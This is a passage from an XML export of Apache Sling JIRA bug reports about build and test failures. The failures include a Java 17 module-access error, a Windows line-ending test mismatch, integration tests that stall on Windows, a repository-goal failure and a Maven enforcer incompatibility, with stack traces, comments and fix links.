	at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:199)
	at java.base/java.lang.reflect.Method.setAccessible(Method.java:193)
	at org.mockito.cglib.core.ReflectUtils$2.run(ReflectUtils.java:57)
	at java.base/java.security.AccessController.doPrivileged(AccessController.java:318)
	at org.mockito.cglib.core.ReflectUtils.&amp;lt;clinit&amp;gt;(ReflectUtils.java:47)
	... 45 more
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13542701">SLING-11936</key>
            <summary>Sling Feature Maven Plugin fails on Java 17: module java.base does not &quot;opens java.lang&quot; to unnamed module @74fa148d</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Thu, 6 Jul 2023 13:40:07 +0000</created>
                <updated>Mon, 10 Jul 2023 12:00:52 +0000</updated>
                            <resolved>Thu, 6 Jul 2023 16:18:12 +0000</resolved>
                                                    <fixVersion>OSGi Feature Maven Plugin 1.7.2</fixVersion>
                                    <component>Feature Model</component>
                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 15 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1j048:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11935] JarDecompressorTest.testWithEmbeddedJar fails on Jenkins/Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11935</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;This is the only CI failure, but I don&apos;t understand enough about the JarDecompressor to make an informed fix. I will ignore the test on Windows for now, but it would be great to understand the root cause and fix it.&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] org.apache.sling.feature.maven.mojos.JarDecompressorTest.testJarWithEmbeddedJar  Time elapsed: 0.071 s  &amp;lt;&amp;lt;&amp;lt; FAILURE!
java.lang.AssertionError: expected:&amp;lt;2108&amp;gt; but was:&amp;lt;1984&amp;gt;
	at org.junit.Assert.fail(Assert.java:89)
	at org.junit.Assert.failNotEquals(Assert.java:835)
	at org.junit.Assert.assertEquals(Assert.java:647)
	at org.junit.Assert.assertEquals(Assert.java:633)
	at org.apache.sling.feature.maven.mojos.JarDecompressorTest.testJarWithEmbeddedJar(JarDecompressorTest.java:81)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306)
	at org.junit.runners.BlockJUnit4ClassRunner$1.evaluate(BlockJUnit4ClassRunner.java:100)
	at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:366)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:103)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:63)
	at org.junit.runners.ParentRunner$4.run(ParentRunner.java:331)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:79)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:329)
	at org.junit.runners.ParentRunner.access$100(ParentRunner.java:66)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:293)
	at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:413)
	at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:364)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:272)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:237)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:158)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:428)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:562)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:548)&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13542696">SLING-11935</key>
            <summary>JarDecompressorTest.testWithEmbeddedJar fails on Jenkins/Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Thu, 6 Jul 2023 13:11:51 +0000</created>
                <updated>Mon, 23 Dec 2024 13:32:33 +0000</updated>
                            <resolved>Mon, 31 Jul 2023 06:49:03 +0000</resolved>
                                                    <fixVersion>OSGi Feature Maven Plugin 1.7.4</fixVersion>
                                    <component>Feature Model</component>
                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17740597" author="rombert" created="Thu, 6 Jul 2023 13:17:53 +0000"  >&lt;p&gt;The jar decompression was added by &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=davidb&quot; class=&quot;user-hover&quot; rel=&quot;davidb&quot;&gt;davidb&lt;/a&gt; for &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-8692&quot; title=&quot;Slingfeature maven plugin: add option to decompress artifacts stored in the repository goal&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-8692&quot;&gt;&lt;del&gt;SLING-8692&lt;/del&gt;&lt;/a&gt;. David, maybe you have an idea about this specific test failure on Windows?&lt;/p&gt;</comment>
                            <comment id="17740637" author="davidb" created="Thu, 6 Jul 2023 14:42:15 +0000"  >&lt;p&gt;I have no access to a Windows machine at the moment, but looking into it briefly I found that the test seems to be failing on this line: &lt;a href=&quot;https://github.com/apache/sling-slingfeature-maven-plugin/blob/master/src/test/java/org/apache/sling/feature/maven/mojos/JarDecompressorTest.java#L81C35-L81C35&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-slingfeature-maven-plugin/blob/master/src/test/java/org/apache/sling/feature/maven/mojos/JarDecompressorTest.java#L81C35-L81C35&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That line is comparing this file &lt;a href=&quot;https://github.com/apache/sling-slingfeature-maven-plugin/blob/master/src/test/resources/repository/textfile.txt&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-slingfeature-maven-plugin/blob/master/src/test/resources/repository/textfile.txt&lt;/a&gt; with the result of what was extracted out of the jar file.&lt;/p&gt;

&lt;p&gt;It looks like some automatic line feed conversion is done on the file compared against, because I think the difference is that the line feeds on windows are &lt;tt&gt;\r\n&lt;/tt&gt; whereas in unix they&apos;re just &lt;tt&gt;\n&lt;/tt&gt; which would add probably this number of bytes.&lt;/p&gt;</comment>
                            <comment id="17740670" author="rombert" created="Thu, 6 Jul 2023 15:25:25 +0000"  >&lt;p&gt;I think you&apos;re spot on &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=davidb&quot; class=&quot;user-hover&quot; rel=&quot;davidb&quot;&gt;davidb&lt;/a&gt;, thanks for looking into this. That file has 124 lines, which is precisely the difference between the &apos;expected&apos; and &apos;actual&apos; sizes.&lt;/p&gt;

&lt;p&gt;I&apos;ve disabled this particular test on Windows for now, I won&apos;t have time to make an actual fix, but if anyone has the time (and probably a Windows machine), PRs are welcome&lt;/p&gt;</comment>
                            <comment id="17749054" author="kwin" created="Mon, 31 Jul 2023 06:49:03 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-slingfeature-maven-plugin/commit/92aa581a90f578005466279eb4716edef4545c26&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-slingfeature-maven-plugin/commit/92aa581a90f578005466279eb4716edef4545c26&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                                                <inwardlinks description="is cloned by">
                                        <issuelink>
            <issuekey id="13603043">SLING-12596</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                            <outwardlinks description="duplicates">
                                        <issuelink>
            <issuekey id="13255844">SLING-8692</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 12 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1j034:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11934] Plug-in ITs fail on Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11934</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Seen at &lt;a href=&quot;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-feature-launcher-maven-plugin/detail/master/179/pipeline/59&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ci-builds.apache.org/blue/organizations/jenkins/Sling%2Fmodules%2Fsling-feature-launcher-maven-plugin/detail/master/179/pipeline/59&lt;/a&gt; &lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] --- invoker:3.3.0:integration-test (integration-test) @ feature-launcher-maven-plugin ---
[INFO] Building: empty-config-it\pom.xml
[INFO] run post-build script verify.groovy
[INFO]           empty-config-it\pom.xml .......................... SUCCESS (39.8 s)
[INFO] Building: simple-for-SLING-10956-it\pom.xml
Sending interrupt signal to process
[INFO] run post-build script verify.groovy
[INFO]           simple-for-SLING-10956-it\pom.xml ................ SUCCESS (1622.0 s)
[INFO] Building: simple-it\pom.xml
script returned exit code -1
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13542564">SLING-11934</key>
            <summary>Plug-in ITs fail on Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 5 Jul 2023 16:03:02 +0000</created>
                <updated>Fri, 5 Sep 2025 15:40:10 +0000</updated>
                                                            <fixVersion>Feature Launcher Maven Plugin 1.0.0</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17740273" author="rombert" created="Wed, 5 Jul 2023 16:07:24 +0000"  >&lt;p&gt;Maybe relevant - the ITs pass very quickly on Linux&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] --- invoker:3.3.0:integration-test (integration-test) @ feature-launcher-maven-plugin ---
[INFO] Building: simple-it/pom.xml
[INFO] run post-build script verify.groovy
[INFO]           simple-it/pom.xml ................................ SUCCESS (38.3 s)
[INFO] Building: empty-config-it/pom.xml
[INFO] run post-build script verify.groovy
[INFO]           empty-config-it/pom.xml .......................... SUCCESS (15.0 s)
[INFO] Building: simple-for-SLING-10956-it/pom.xml
[INFO] run post-build script verify.groovy
[INFO]           simple-for-SLING-10956-it/pom.xml ................ SUCCESS (19.8 s)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but seem to stall on Windows &lt;/p&gt;</comment>
                            <comment id="17740661" author="rombert" created="Thu, 6 Jul 2023 15:18:03 +0000"  >&lt;p&gt;I&apos;ve disabled the invoker ITs on Windows to make the build pass. We will re-enable them once fixed.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 15 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1iza0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11932] The repository goal fails if the project&apos;s artifact is referenced</title>
                <link>https://issues.apache.org/jira/browse/SLING-11932</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;With the &lt;tt&gt;slingfeature-maven-plugin&lt;/tt&gt; it is possible to attach the main project artifact to the generated feature files.&lt;/p&gt;

&lt;p&gt;This is not properly handled in the repository goal, which always fails with&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] Failed to execute goal org.apache.sling:slingfeature-maven-plugin:1.7.0:repository (create-repository) on project org.apache.sling.servlets.oidc-rp: Execution create-repository of goal org.apache.sling:slingfeature-maven-plugin:1.7.0:repository failed: Parameter &apos;srcFile&apos; is not a file: /home/robert/sources/apache/sling/whiteboard/org.apache.sling.servlets.oidc-rp/target/classes&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;------&lt;/p&gt;

&lt;p&gt;Steps to reproduce:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;$ git clone https://github.com/apache/sling-whiteboard --branch issue/SLING-11932-repro
$ mvn -f sling-whiteboard/org.apache.sling.servlets.oidc-rp/pom.xml package
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13542538">SLING-11932</key>
            <summary>The repository goal fails if the project&apos;s artifact is referenced</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 5 Jul 2023 12:37:14 +0000</created>
                <updated>Mon, 10 Jul 2023 12:00:52 +0000</updated>
                            <resolved>Wed, 5 Jul 2023 14:49:59 +0000</resolved>
                                    <version>OSGi Feature Maven Plugin 1.7.0</version>
                                    <fixVersion>OSGi Feature Maven Plugin 1.7.2</fixVersion>
                                    <component>Feature Model</component>
                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17740245" author="cziegeler" created="Wed, 5 Jul 2023 14:49:59 +0000"  >&lt;p&gt;Fixed with &lt;a href=&quot;https://github.com/apache/sling-slingfeature-maven-plugin/commit/c1ce9a65c94b13293109b30df8b5f8ab624afaa3&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-slingfeature-maven-plugin/commit/c1ce9a65c94b13293109b30df8b5f8ab624afaa3&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 16 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1iz48:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11927] Sling&apos;s maven-enforcer-rules incompatible with maven-enforcer-plugin 3.2.0 and above</title>
                <link>https://issues.apache.org/jira/browse/SLING-11927</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The following error is exposed&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
Execution xxx of goal org.apache.maven.plugins:maven-enforcer-plugin:3.3.0:enforce failed: A required &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;was missing &lt;span class=&quot;code-keyword&quot;&gt;while&lt;/span&gt; executing org.apache.maven.plugins:maven-enforcer-plugin:3.3.0:enforce: org/apache/maven/plugins/enforcer/AbstractNonCacheableEnforcerRule
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is due to the fact that the class has been removed in &lt;a href=&quot;https://github.com/apache/maven-enforcer/commit/26697b16741b0e3b488ec322eb2fc0dc2a8da9ed&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/maven-enforcer/commit/26697b16741b0e3b488ec322eb2fc0dc2a8da9ed&lt;/a&gt; but is still used as parent of &lt;a href=&quot;https://github.com/apache/sling-maven-enforcer-rules/blob/327aefefda555798337f7a6ff9e182edc277dc74/src/main/java/org/apache/sling/maven/enforcer/RequireProvidedDependenciesInRuntimeClasspath.java#L80&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-maven-enforcer-rules/blob/327aefefda555798337f7a6ff9e182edc277dc74/src/main/java/org/apache/sling/maven/enforcer/RequireProvidedDependenciesInRuntimeClasspath.java#L80&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13542444">SLING-11927</key>
            <summary>Sling&apos;s maven-enforcer-rules incompatible with maven-enforcer-plugin 3.2.0 and above</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Tue, 4 Jul 2023 17:19:29 +0000</created>
                <updated>Sat, 8 Jul 2023 13:52:13 +0000</updated>
                            <resolved>Wed, 5 Jul 2023 09:58:30 +0000</resolved>
                                    <version>Maven Enforcer Rules 1.1.0</version>
                                    <fixVersion>Maven Enforcer Rules 1.2.0</fixVersion>
                                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17739968" author="kwin" created="Tue, 4 Jul 2023 17:23:58 +0000"  >&lt;p&gt;API has been clarified in &lt;a href=&quot;https://maven.apache.org/enforcer/enforcer-api/writing-a-custom-rule.html#project-with-custom-enforcer-rule&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://maven.apache.org/enforcer/enforcer-api/writing-a-custom-rule.html#project-with-custom-enforcer-rule&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;The classes available from enforcer-rules must not be used from custom rules, as those are not considered API and may change in backwards-incompatible ways with every maven-enforcer version (even minor ones).&lt;/p&gt;&lt;/blockquote&gt;</comment>
